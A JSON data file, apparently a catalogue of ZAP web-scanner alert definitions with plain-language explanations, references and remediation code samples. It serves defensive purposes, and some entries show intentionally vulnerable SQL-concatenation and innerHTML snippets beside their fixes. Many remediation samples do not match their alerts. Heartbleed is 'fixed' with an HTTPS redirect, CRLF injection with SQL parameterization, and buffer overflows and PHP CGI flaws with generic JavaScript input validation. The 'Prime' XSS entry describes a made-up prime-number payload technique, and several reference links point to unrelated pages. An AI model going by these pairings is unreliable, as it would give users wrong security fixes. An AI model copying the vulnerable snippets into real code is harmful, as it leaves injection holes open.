        "url": "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Configure secure session cookies",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// SECURE SESSION:\napp.use(session({\n  name: 'sessionId',\n  secret: process.env.SESSION_SECRET,\n  httpOnly: true,\n  secure: true,\n  sameSite: 'strict',\n  maxAge: 1800000 // 30 minutes\n}));"
      }
    ]
  },
  {
    "pluginId": 10113,
    "title": "Verification Request Identified",
    "defaultRisk": "Low",
    "cweid": "200",
    "description": "Verification request identification vulnerabilities occur when applications expose information about account verification processes, password reset mechanisms, or email validation systems through URLs, responses, or timing differences, potentially allowing attackers to enumerate valid accounts or bypass verification controls.",
    "simplified_description": "Your application is revealing information about its account verification processes, like showing attackers how your email verification system works and which email addresses are valid. This helps attackers identify active accounts, understand your verification workflows, and potentially craft targeted attacks against your user base or bypass security controls.",
    "solution": "Implement generic verification responses that don't reveal account status and use consistent timing for all verification requests.",
    "simplified_solution": "Use identical success messages for all verification requests regardless of account existence. Implement consistent response times to prevent timing attacks. Don't reveal whether email addresses are registered or verified. Use secure token generation and validation methods. Ensure verification URLs expire and cannot be reused.",
    "references": [
      {
        "name": "OWASP Forgot Password Cheat Sheet",
        "url": "https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html"
      },
      {
        "name": "CWE-200: Information Exposure",
        "url": "https://cwe.mitre.org/data/definitions/200.html"
      },
      {
        "name": "OWASP Testing Guide: Testing for Account Enumeration and Guessable User Account",
        "url": "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/03-Authentication_Testing/04-Testing_for_User_Enumeration_and_Guessable_User_Account.html"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Validate and sanitize all external input data",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// ALWAYS VALIDATE USER INPUT:\nconst userInput = req.body.data;\nconst sanitized = validator.escape(userInput);\nconst validated = Joi.validate(sanitized, schema);\n\n// NEVER TRUST EXTERNAL DATA"
      }
    ]
  },
  {
    "pluginId": 10115,
    "title": "Script Served From Malicious Domain (polyfill)",
    "defaultRisk": "High",
    "cweid": "829",
    "description": "Application includes scripts from untrusted or potentially malicious external domains, particularly vulnerable polyfill services.",
    "simplified_description": "Your website is loading JavaScript from external sources that could be malicious. This is like inviting strangers into your home - they can do anything they want, including stealing user data or injecting malicious code.",
    "solution": "Host all third-party scripts locally or use trusted, integrity-protected CDN links with proper fallbacks.",
    "simplified_solution": "Download and host JavaScript libraries locally instead of loading from external CDNs. If you must use external scripts, always use Subresource Integrity (SRI) hashes to verify they haven't been tampered with.",
    "references": [
      {
        "name": "OWASP Subresource Integrity",
        "url": "https://owasp.org/www-project-secure-headers/"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Validate and sanitize all external input data",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// ALWAYS VALIDATE USER INPUT:\nconst userInput = req.body.data;\nconst sanitized = validator.escape(userInput);\nconst validated = Joi.validate(sanitized, schema);\n\n// NEVER TRUST EXTERNAL DATA"
      }
    ]
  },
  {
    "pluginId": 10116,
    "title": "ZAP is Out of Date",
    "defaultRisk": "Low",
    "cweid": 200,
    "description": "The ZAP tool version being used is outdated and may be missing important security features, bug fixes, and vulnerability detection capabilities, leading to incomplete security assessments.",
    "simplified_description": "Your security scanner is outdated and won't know about the latest threats and attack methods. This means it might miss new types of vulnerabilities that hackers have recently discovered.",
    "solution": "Update ZAP to the latest stable version to ensure access to current security features and vulnerability detection capabilities.",
    "simplified_solution": "Update your ZAP security scanner to the newest version. Download the latest version from the official OWASP website or use ZAP's built-in update feature. Set up automatic updates for ongoing protection.",
    "references": [
      {
        "name": "OWASP ZAP Official Website",
        "url": "https://www.zaproxy.org/"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Validate and sanitize all external input data",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// ALWAYS VALIDATE USER INPUT:\nconst userInput = req.body.data;\nconst sanitized = validator.escape(userInput);\nconst validated = Joi.validate(sanitized, schema);\n\n// NEVER TRUST EXTERNAL DATA"
      }
    ]
  },
  {
    "pluginId": 10202,
    "title": "Absence of Anti-CSRF Tokens",
    "defaultRisk": "High",
    "cweid": "352",
    "description": "The application lacks Cross-Site Request Forgery (CSRF) protection mechanisms. Without CSRF tokens, malicious websites can force authenticated users to perform unwanted actions on your application, potentially leading to unauthorized data changes, account takeovers, or other security breaches.",
    "simplified_description": "Your website is vulnerable to attacks where malicious sites can make your users perform actions without their knowledge. This is like someone forging your signature on documents - attackers can make requests that appear to come from legitimate users, allowing them to change passwords, make purchases, transfer money, or delete data.",
    "solution": "Implement CSRF protection using anti-CSRF tokens, SameSite cookie attributes, and additional defense-in-depth measures like origin and referrer header validation.",
    "simplified_solution": "Add CSRF tokens to all forms and AJAX requests, validate tokens on the server, use SameSite cookie attributes, and implement additional security measures like origin validation and double-submit cookie patterns.",
    "references": [
      {
        "name": "OWASP CSRF Prevention Cheat Sheet",
        "url": "https://owasp.org/www-project-cheat-sheets/cheatsheets/Cross_Site_Request_Forgery_Prevention_Cheat_Sheet.html"
      },
      {
        "name": "CWE-352: Cross-Site Request Forgery (CSRF)",
        "url": "https://cwe.mitre.org/data/definitions/352.html"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Implement CSRF tokens for state-changing operations",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// SECURE:\napp.use(csrf());\napp.post('/api/data', (req, res) => {\n  res.cookie('XSRF-TOKEN', req.csrfToken());\n});"
      }
    ]
  },
  {
    "pluginId": 20015,
    "title": "Heartbleed OpenSSL Vulnerability",
    "defaultRisk": "Critical",
    "cweid": "200",
    "description": "The Heartbleed vulnerability (CVE-2014-0160) is a serious bug in OpenSSL's TLS/DTLS heartbeat extension that allows attackers to read up to 64KB of memory from the server or client, potentially exposing sensitive data including private keys, session tokens, and passwords.",
    "simplified_description": "Your server is vulnerable to the Heartbleed bug, which is like having a hole in your secure communication system that allows attackers to secretly listen in and steal sensitive information including passwords, private keys, and user data. This is one of the most critical cybersecurity vulnerabilities discovered, allowing attackers to extract sensitive data directly from server memory.",
    "solution": "Update OpenSSL to version 1.0.1g or later, revoke and reissue all SSL certificates, and invalidate all existing sessions and tokens.",
    "simplified_solution": "Immediately upgrade your OpenSSL library to a secure version (1.0.1g or later), replace all SSL certificates, and force all users to log out and change their passwords. This requires patching systems, rotating security credentials, and implementing proper security monitoring.",
    "references": [
      {
        "name": "CVE-2014-0160 - Heartbleed Bug",
        "url": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160"
      },
      {
        "name": "Heartbleed.com - Official Information",
        "url": "https://heartbleed.com/"
      },
      {
        "name": "NIST Vulnerability Database",
        "url": "https://nvd.nist.gov/vuln/detail/CVE-2014-0160"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Redirect all HTTP traffic to HTTPS",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// FORCE HTTPS:\napp.use((req, res, next) => {\n  if (!req.secure) {\n    return res.redirect(301, 'https://' + req.headers.host + req.url);\n  }\n  next();\n});"
      }
    ]
  },
  {
    "pluginId": 20017,
    "title": "Source Code Disclosure - CVE-2012-1823",
    "defaultRisk": "High",
    "cweid": "200",
    "description": "CVE-2012-1823 is a PHP source code disclosure vulnerability that allows attackers to view arbitrary PHP source code by passing specific query parameters, potentially exposing sensitive information, database credentials, and application logic.",
    "simplified_description": "Your PHP application has a critical vulnerability that allows anyone to view your source code simply by adding special parameters to URLs. This is like having the blueprints to your entire business publicly available - attackers can see your database passwords, authentication logic, and find every security weakness in your code to craft targeted attacks against your system.",
    "solution": "Upgrade to patched PHP versions and implement input validation to prevent source code disclosure through parameter manipulation.",
    "simplified_solution": "Immediately upgrade PHP to version 5.4.2 or later, or apply security patches for your current version. Implement strict input validation to reject malicious parameters, configure your web server to prevent source code access, and use secure error handling that doesn't expose sensitive information. Never expose production source code under any circumstances.",
    "references": [
      {
        "name": "CVE-2012-1823 - PHP Source Code Disclosure",
        "url": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-1823"
      },
      {
        "name": "PHP Security Advisories",
        "url": "https://www.php.net/security-advisories.php"
      },
      {
        "name": "OWASP PHP Security Cheat Sheet",
        "url": "https://cheatsheetseries.owasp.org/cheatsheets/PHP_Security_Cheat_Sheet.html"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Validate and sanitize all external input data",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// ALWAYS VALIDATE USER INPUT:\nconst userInput = req.body.data;\nconst sanitized = validator.escape(userInput);\nconst validated = Joi.validate(sanitized, schema);\n\n// NEVER TRUST EXTERNAL DATA"
      }
    ]
  },
  {
    "pluginId": 20018,
    "title": "Remote Code Execution - CVE-2012-1823",
    "defaultRisk": "Critical",
    "cweid": 94,
    "description": "CVE-2012-1823 is a critical vulnerability in PHP CGI versions that allows remote code execution through improper handling of query string parameters. Attackers can execute arbitrary PHP code on the server by manipulating request parameters, potentially leading to complete server compromise.",
    "simplified_description": "Your PHP server has a critical security flaw that allows attackers to run any code they want on your server, like giving strangers the keys to your house and telling them to make themselves at home. Attackers can steal data, install malware, or take complete control of your server through this vulnerability.",
    "solution": "Immediately upgrade PHP to a version that patches CVE-2012-1823 (PHP 5.4.3+, 5.3.13+, or newer). If immediate upgrade is not possible, disable CGI mode or implement server-side workarounds. Additionally, scan for any signs of exploitation and audit the system for potential compromise.",
    "simplified_solution": "Update your PHP installation immediately to the latest stable version. This vulnerability affects older PHP versions running in CGI mode. If you cannot upgrade right away, temporarily disable PHP CGI or apply security patches. Check your server logs for any signs of exploitation and consider the server potentially compromised if running vulnerable versions.",
    "references": [
      {
        "name": "CVE-2012-1823 - NVD",
        "url": "https://nvd.nist.gov/vuln/detail/CVE-2012-1823"
      },
      {
        "name": "PHP Security Advisory",
        "url": "https://www.php.net/archive/2012.php#id2012-05-03-1"
      },
      {
        "name": "OWASP Remote Code Execution Guide",
        "url": "https://owasp.org/www-project-top-ten/2017/A1_2017-Injection"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Validate and sanitize all external input data",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// ALWAYS VALIDATE USER INPUT:\nconst userInput = req.body.data;\nconst sanitized = validator.escape(userInput);\nconst validated = Joi.validate(sanitized, schema);\n\n// NEVER TRUST EXTERNAL DATA"
      }
    ]
  },
  {
    "pluginId": 20019,
    "title": "External Redirect",
    "defaultRisk": "Medium",
    "cweid": "601",
    "description": "The application contains an open redirect vulnerability where user-controlled input is used to redirect users to external websites without proper validation. This allows attackers to redirect users to malicious sites for phishing, malware distribution, or other attacks.",
    "simplified_description": "Your application has a security flaw that allows attackers to redirect users to malicious websites. This is like having a receptionist that redirects visitors to any address they provide - attackers could send your users to fake login pages, malware sites, or phishing websites that steal their credentials.",
    "solution": "Implement strict validation of redirect URLs, use a whitelist approach, and avoid direct user input for redirect destinations.",
    "simplified_solution": "Create a list of approved redirect URLs, validate all redirect parameters against this whitelist, use relative URLs when possible, and implement proper URL validation to prevent malicious redirects.",
    "references": [
      {
        "name": "OWASP Open Redirect",
        "url": "https://owasp.org/www-project-top-ten/2017/A1_2017-Injection"
      },
      {
        "name": "CWE-601: URL Redirection to Untrusted Site",
        "url": "https://cwe.mitre.org/data/definitions/601.html"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Validate and sanitize all external input data",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// ALWAYS VALIDATE USER INPUT:\nconst userInput = req.body.data;\nconst sanitized = validator.escape(userInput);\nconst validated = Joi.validate(sanitized, schema);\n\n// NEVER TRUST EXTERNAL DATA"
      }
    ]
  },
  {
    "pluginId": 30001,
    "title": "Buffer Overflow",
    "defaultRisk": "High",
    "cweid": 121,
    "description": "Buffer overflow vulnerabilities occur when a program writes data beyond the boundaries of a fixed-length buffer, overwriting adjacent memory locations. This can lead to program crashes, data corruption, or arbitrary code execution. The vulnerability typically arises from unsafe use of functions like strcpy(), sprintf(), gets(), or improper array bounds checking.",
    "simplified_description": "Your application has a memory safety vulnerability where it can be tricked into writing data beyond allocated memory limits, like pouring water into a glass that's already full - the excess water spills over and damages whatever is nearby. Attackers can exploit this to crash your application, steal sensitive data, or execute malicious code on your server.",
    "solution": "Implement bounds checking, use safe string functions, enable compiler protections, and adopt memory-safe programming practices.",
    "simplified_solution": "Replace unsafe functions like strcpy() and gets() with safe alternatives like strncpy() and fgets(). Always validate array bounds and buffer sizes. Enable compiler protections like stack canaries and ASLR. Use memory-safe languages or frameworks when possible. Implement comprehensive input validation and length limits for all data processing.",
    "references": [
      {
        "name": "OWASP Buffer Overflow",
        "url": "https://owasp.org/www-project-cheat-sheets/cheatsheets/Buffer_Overflow_Cheat_Sheet.html"
      },
      {
        "name": "CWE-121: Stack-based Buffer Overflow",
        "url": "https://cwe.mitre.org/data/definitions/121.html"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Validate and sanitize all external input data",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// ALWAYS VALIDATE USER INPUT:\nconst userInput = req.body.data;\nconst sanitized = validator.escape(userInput);\nconst validated = Joi.validate(sanitized, schema);\n\n// NEVER TRUST EXTERNAL DATA"
      }
    ]
  },
  {
    "pluginId": 30002,
    "title": "Format String Error",
    "defaultRisk": "High",
    "cweid": 134,
    "description": "Format string vulnerabilities occur when user-supplied input is used directly as a format string in functions like printf(), sprintf(), syslog(), or error logging functions. This allows attackers to read memory contents, write to arbitrary memory locations, or execute arbitrary code by crafting format strings with %x, %s, %n specifiers.",
    "simplified_description": "Your application has a vulnerability where malicious users can inject special formatting characters into input that gets processed by string formatting functions. This is like giving someone a blank check and letting them fill in the amount - attackers can use format specifiers like %x, %s, and %n to read sensitive data from memory or even modify your program's memory to execute malicious code.",
    "solution": "Never use user-supplied input as format strings. Always use proper format specifiers and validate input before string formatting operations.",
    "simplified_solution": "Replace dangerous functions that use user input as format strings with safe alternatives that separate format strings from data. Always use literal format strings like '%s' for user input, never use user input directly as the format string. Enable compiler warnings for format string vulnerabilities and validate all input that will be used in formatting operations.",
    "references": [
      {
        "name": "OWASP Format String Attack",
        "url": "https://owasp.org/www-project-cheat-sheets/cheatsheets/Format_String_Cheat_Sheet.html"
      },
      {
        "name": "CWE-134: Use of Externally-Controlled Format String",
        "url": "https://cwe.mitre.org/data/definitions/134.html"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Validate and sanitize all external input data",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// ALWAYS VALIDATE USER INPUT:\nconst userInput = req.body.data;\nconst sanitized = validator.escape(userInput);\nconst validated = Joi.validate(sanitized, schema);\n\n// NEVER TRUST EXTERNAL DATA"
      }
    ]
  },
  {
    "pluginId": 40003,
    "title": "CRLF Injection",
    "defaultRisk": "Medium",
    "cweid": "93",
    "description": "CRLF (Carriage Return Line Feed) Injection vulnerabilities allow attackers to inject HTTP headers through CRLF characters, potentially leading to HTTP response splitting, cache poisoning, or cross-site scripting.",
    "simplified_description": "Your application has a security flaw that allows attackers to inject special characters that can manipulate HTTP headers. This is like allowing someone to add fake addresses to your mail - attackers can redirect users to malicious websites, steal cookies, or poison web caches.",
    "solution": "Implement strict input validation, remove CRLF characters from user input, use secure HTTP client libraries, and validate all header values.",
    "simplified_solution": "Remove or escape all carriage return (\\r) and line feed (\\n) characters from user input, validate all data before using it in HTTP headers, use modern web frameworks that automatically handle header injection, and implement proper input sanitization.",
    "references": [
      {
        "name": "OWASP CRLF Injection",
        "url": "https://owasp.org/www-community/vulnerabilities/CRLF_Injection"
      },
      {
        "name": "CWE-93: Improper Neutralization of CRLF Sequences ('HTTP Response Splitting')",
        "url": "https://cwe.mitre.org/data/definitions/93.html"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Use parameterized queries to prevent SQL injection",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// VULNERABLE:\nconst query = \"SELECT * FROM users WHERE id = \" + userId;\n\n// SECURE:\nconst query = \"SELECT * FROM users WHERE id = ?\";\nconst result = db.query(query, [userId]);"
      }
    ]
  },
  {
    "pluginId": 40008,
    "title": "Parameter Tampering",
    "defaultRisk": "Medium",
    "cweid": "642",
    "description": "Parameter tampering occurs when attackers modify parameters in HTTP requests, hidden form fields, cookies, or URL parameters to bypass security controls, manipulate application logic, access unauthorized data, or escalate privileges. This includes tampering with price parameters, user IDs, quantity fields, status flags, authentication tokens, or any other data transmitted between client and server that isn't properly validated on the server side.",
    "simplified_description": "Your application has a security flaw that allows attackers to modify data being sent between their browser and your server. This is like allowing someone to change prices on price tags before they reach the cashier - attackers can manipulate product prices, change user IDs to access other people's accounts, modify quantities in shopping carts, or bypass security checks by tampering with authentication tokens and parameters.",
    "solution": "Implement comprehensive server-side validation for all parameters, use digital signatures for critical data, validate business logic constraints, implement proper session management, use server-side state management, and never trust client-supplied data for security decisions.",
    "simplified_solution": "Validate every parameter on the server before processing, even if it was validated on the client. Check that prices match your database, verify users can only access their own data, validate all business rules, use secure session tokens, implement CSRF protection, add digital signatures to critical parameters, log all modifications for audit purposes, and never trust hidden form fields or JavaScript validation for security.",
    "references": [
      {
        "name": "OWASP Parameter Tampering",
        "url": "https://owasp.org/www-project-top-ten/2017/A1_2017-Injection"
      },
      {
        "name": "CWE-642: External Control of Critical State Data",
        "url": "https://cwe.mitre.org/data/definitions/642.html"
      },
      {
        "name": "OWASP Input Validation Cheat Sheet",
        "url": "https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Validate and sanitize all external input data",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// ALWAYS VALIDATE USER INPUT:\nconst userInput = req.body.data;\nconst sanitized = validator.escape(userInput);\nconst validated = Joi.validate(sanitized, schema);\n\n// NEVER TRUST EXTERNAL DATA"
      }
    ]
  },
  {
    "pluginId": 40009,
    "title": "Server Side Include",
    "defaultRisk": "Critical",
    "cweid": "CWE-74",
    "description": "Server Side Include (SSI) injection vulnerabilities allow attackers to inject arbitrary commands into web pages that use Server Side Includes. This occurs when user input is incorporated into SSI directives without proper validation, enabling attackers to execute server-side commands, read arbitrary files, gain system information, and potentially achieve remote code execution on the web server.",
    "simplified_description": "Your website has a critical security flaw that allows attackers to execute commands on your server by injecting special HTML comments called Server Side Includes. This is like giving attackers a command prompt on your web server - they can read sensitive files like configuration files and password databases, execute system commands to take control of your server, steal sensitive data, and potentially use your server to attack other systems.",
    "solution": "Disable Server Side Includes if not needed, properly validate and sanitize all user input that might be included in SSI directives, implement input filtering to block SSI syntax patterns, use output encoding for user-generated content, configure web server to limit SSI execution to trusted files only, and implement proper file permission controls.",
    "simplified_solution": "Immediately disable Server Side Includes if they're not essential for your application. If you must use SSI, ensure all user input is thoroughly validated to prevent SSI injection by filtering out SSI syntax patterns (<!--#...-->), implement strict allow-list validation for input parameters, use output encoding, and configure your web server to execute SSI only in specific trusted directories with proper file permissions.",
    "references": [
      {
        "name": "OWASP Server-Side Template Injection",
        "url": "https://owasp.org/www-project-cheat-sheets/cheatsheets/Server_Side_Template_Injection_Cheat_Sheet.html"
      },
      {
        "name": "CWE-74: Injection",
        "url": "https://cwe.mitre.org/data/definitions/74.html"
      },
      {
        "name": "Apache SSI Documentation",
        "url": "https://httpd.apache.org/docs/current/howto/ssi.html"
      },
      {
        "name": "Nginx SSI Module",
        "url": "https://nginx.org/en/docs/http/ngx_http_ssi_module.html"
      },
      {
        "name": "MITRE ATT&CK Technique T1190 - Exploit Public-Facing Application",
        "url": "https://attack.mitre.org/techniques/T1190/"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Validate and sanitize all external input data",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// ALWAYS VALIDATE USER INPUT:\nconst userInput = req.body.data;\nconst sanitized = validator.escape(userInput);\nconst validated = Joi.validate(sanitized, schema);\n\n// NEVER TRUST EXTERNAL DATA"
      }
    ]
  },
  {
    "pluginId": 40012,
    "title": "Cross Site Scripting (Reflected)",
    "defaultRisk": "High",
    "cweid": "79",
    "description": "Reflected Cross-Site Scripting (XSS) occurs when untrusted user input is immediately returned by the web application in an error message, search result, or any other response that includes some or all of the input provided by the user as part of the request, without that data being made safe to render in the browser, and without permanently storing the user provided data.",
    "simplified_description": "Your application has a security vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users. This is like allowing someone to write graffiti on your walls that contains harmful instructions - when other people read it, their computers execute those harmful instructions, potentially stealing their login credentials, session cookies, or personal information.",
    "solution": "Implement proper input validation, output encoding, and use Content Security Policy (CSP) headers to prevent XSS attacks.",
    "simplified_solution": "Always sanitize user input before displaying it, use secure coding frameworks that automatically protect against XSS, implement Content Security Policy headers, and validate all user input on both client and server sides.",
    "references": [
      {
        "name": "OWASP XSS Prevention Cheat Sheet",
        "url": "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
      },
      {
        "name": "CWE-79: Improper Neutralization of Input During Web Page Generation",
        "url": "https://cwe.mitre.org/data/definitions/79.html"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Validate and sanitize all external input data",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// ALWAYS VALIDATE USER INPUT:\nconst userInput = req.body.data;\nconst sanitized = validator.escape(userInput);\nconst validated = Joi.validate(sanitized, schema);\n\n// NEVER TRUST EXTERNAL DATA"
      }
    ]
  },
  {
    "pluginId": 40014,
    "title": "Cross Site Scripting (Persistent)",
    "defaultRisk": "Critical",
    "cweid": "79",
    "description": "Persistent (stored) Cross-Site Scripting occurs when the malicious script is permanently stored on the target servers, such as in a database, in a message forum post, in a comment field, in visitor logs, in an audit trail, or in other fields. The victim then retrieves the malicious script from the server when it requests the stored information.",
    "simplified_description": "Your application has a critical security flaw that allows attackers to permanently store malicious scripts in your system. This is like allowing someone to write invisible poison on your walls that affects everyone who reads it - the malicious code gets saved in your database and runs automatically every time someone views the affected page, potentially stealing their credentials or taking control of their accounts.",
    "solution": "Implement proper input validation, output encoding, and secure storage of user-generated content with Content Security Policy.",
    "simplified_solution": "Always validate and sanitize user input before storing it, encode all user-generated content before displaying it, implement Content Security Policy headers, use parameterized queries for database operations, and regularly scan for stored malicious content.",
    "references": [
      {
        "name": "OWASP Stored XSS Prevention",
        "url": "https://owasp.org/www-project-cheat-sheets/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
      },
      {
        "name": "CWE-79: Improper Neutralization of Input During Web Page Generation",
        "url": "https://cwe.mitre.org/data/definitions/79.html"
      }
    ],
    "code_solution_samples": [
      {
        "type": "JavaScript/React",
        "solution_description": "Sanitize '{{param}}' before rendering to DOM.",
        "affected_files": "Frontend components rendering {{filename}}",
        "code": "// ❌ VULNERABLE:\n// If {{param}} contains '{{evidence}}', it will execute.\ndocument.getElementById('output').innerHTML = urlParams.get('{{param}}');\n\n// ✅ SECURE:\n// Use textContent to treat '{{param}}' as pure text, or use a sanitizer library.\nconst safeInput = DOMPurify.sanitize(urlParams.get('{{param}}'));\ndocument.getElementById('output').textContent = safeInput;"
      }
    ]
  },
  {
    "pluginId": 40016,
    "title": "Cross Site Scripting (Persistent) - Prime",
    "defaultRisk": "High",
    "cweid": "79",
    "description": "Prime Cross Site Scripting is a sophisticated persistent XSS attack that uses a prime number-based payload generation technique to evade detection and maintain persistence.",
    "simplified_description": "Your website has a sophisticated security vulnerability that allows attackers to inject highly advanced malicious code that's designed to evade security detection. This is like having criminals use special codes that security cameras can't recognize - the attack can persist for long periods and compromise many users.",
    "solution": "Implement advanced XSS detection, strict input validation, comprehensive output encoding, content security policies, and regular security scanning.",
    "simplified_solution": "Deploy advanced web application firewalls, implement strict input validation that blocks suspicious patterns, use modern frameworks with built-in XSS protection, regularly scan for malicious content, and monitor for unusual user behavior patterns.",
    "references": [
      {
        "name": "Advanced XSS Prevention",
        "url": "https://portswigger.net/web-security/cross-site-scripting/advanced"
      },
      {
        "name": "CWE-79: Improper Neutralization of Input During Web Page Generation",
        "url": "https://cwe.mitre.org/data/definitions/79.html"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Validate and sanitize all external input data",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// ALWAYS VALIDATE USER INPUT:\nconst userInput = req.body.data;\nconst sanitized = validator.escape(userInput);\nconst validated = Joi.validate(sanitized, schema);\n\n// NEVER TRUST EXTERNAL DATA"
      }
    ]
  },
  {
    "pluginId": 40017,
    "title": "Cross Site Scripting (Persistent) - Spider",
    "defaultRisk": "High",
    "cweid": "79",
    "description": "Spider-based Cross Site Scripting vulnerabilities occur when web crawlers or spiders trigger XSS payloads stored in the application, affecting automated systems and potentially spreading malware through crawling infrastructure.",
    "simplified_description": "Your website has a security vulnerability that affects not just human users but also automated search engine crawlers and other web spiders. This is like having a disease that can spread through both people and automated systems - attackers can compromise search engine results and spread malware through legitimate crawling activities.",
    "solution": "Implement bot detection, content validation for all user agents, secure spider access controls, and comprehensive output encoding.",
    "simplified_solution": "Implement proper detection and handling of web crawlers, validate and sanitize all content regardless of who accesses it, use secure robots.txt configurations, monitor crawler behavior, and ensure all content is safely encoded for display.",
    "references": [
      {
        "name": "Search Engine Security",
        "url": "https://support.google.com/webmasters/answer/35769"
      },
      {
        "name": "CWE-79: Improper Neutralization of Input During Web Page Generation",
        "url": "https://cwe.mitre.org/data/definitions/79.html"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Validate and sanitize all external input data",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// ALWAYS VALIDATE USER INPUT:\nconst userInput = req.body.data;\nconst sanitized = validator.escape(userInput);\nconst validated = Joi.validate(sanitized, schema);\n\n// NEVER TRUST EXTERNAL DATA"
      }
    ]
  },
  {
    "pluginId": 40018,
    "title": "SQL Injection",
    "defaultRisk": "Critical",
    "cweid": "89",
    "description": "SQL Injection occurs when untrusted data is used to construct SQL queries without proper validation or parameterization. Attackers can manipulate SQL queries to bypass authentication, access unauthorized data, modify or delete database content, and in some cases execute system commands.",
    "simplified_description": "Your application has a critical security flaw that allows attackers to directly control your database queries. This is like giving strangers the ability to speak fluent 'database language' to your database - they can trick it into revealing all your sensitive information, modify your data, or even take complete control of your database. Attackers can steal passwords, user data, financial information, or delete your entire database.",
    "solution": "Use parameterized queries (prepared statements) for all database operations, implement proper input validation, and employ ORM frameworks that provide built-in SQL injection protection.",
    "simplified_solution": "Replace all raw SQL queries with parameterized statements or use secure database frameworks, validate all user input before using it in database operations, implement proper error handling that doesn't reveal database information, and use database access controls with minimal privileges.",
    "references": [
      {
        "name": "OWASP SQL Injection Prevention Cheat Sheet",
        "url": "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html"
      },
      {
        "name": "CWE-89: Improper Neutralization of Special Elements used in an SQL Command",
        "url": "https://cwe.mitre.org/data/definitions/89.html"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Node.js Fix",
        "solution_description": "Fix SQL injection in parameter '{{param}}' by using Prepared Statements.",
        "affected_files": "Database controllers handling {{filename}}",
        "code": "// ❌ VULNERABLE CODE:\n// The parameter '{{param}}' is concatenated directly into the query string.\nconst sql = \"SELECT * FROM data WHERE {{param}} = '\" + req.body.{{param}} + \"'\";\n\n// ✅ SECURE CODE:\n// Use '?' placeholders. The database engine treats '{{param}}' strictly as data.\nconst sql = \"SELECT * FROM data WHERE {{param}} = ?\";\ndb.query(sql, [req.body.{{param}}], (err, result) => {\n  /* handle result */\n});"
      },
      {
        "type": "PHP Fix",
        "solution_description": "Secure PDO implementation for '{{param}}'.",
        "affected_files": "{{filename}}",
        "code": "// ❌ VULNERABLE:\n$sql = \"SELECT * FROM table WHERE {{param}} = \" . $_GET['{{param}}'];\n\n// ✅ SECURE (PDO):\n$stmt = $pdo->prepare('SELECT * FROM table WHERE {{param}} = :{{param}}');\n$stmt->execute(['{{param}}' => $_GET['{{param}}']]);\n$user = $stmt->fetch();"
      }
    ]
  },
  {
    "pluginId": 40019,
    "title": "SQL Injection - MySQL",
    "defaultRisk": "Critical",
    "cweid": "89",
    "description": "MySQL SQL Injection occurs when untrusted user input is directly concatenated into MySQL SQL queries without proper parameterization or sanitization. Attackers can manipulate MySQL-specific syntax including UNION queries, comment sequences (--, /* */), MySQL functions like LOAD_FILE(), INTO OUTFILE, information_schema queries, and bypass authentication techniques to extract sensitive data, modify database content, or achieve remote code execution through MySQL's file system operations.",
